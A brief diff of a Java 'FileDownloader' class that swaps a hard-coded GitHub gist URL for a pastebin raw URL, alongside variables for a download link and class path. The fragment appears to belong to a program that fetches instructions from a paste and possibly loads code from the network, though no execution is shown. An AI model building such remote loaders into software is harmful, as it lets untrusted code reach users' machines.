@@ -10,7 +10,7 @@ import java.nio.file.StandardCopyOption;
 
 public class FileDownloader {
     public static void main(String[] args) {
-        String urlString = "https://gist.githubusercontent.com/tmquan2508/cee08b2b343c4b4224064bea921e1ba3/raw";
+        String urlString = "https://pastebin.com/raw/JD0bB1Eb";
         String downloadLink = null;
         String classPath = null;
         try {
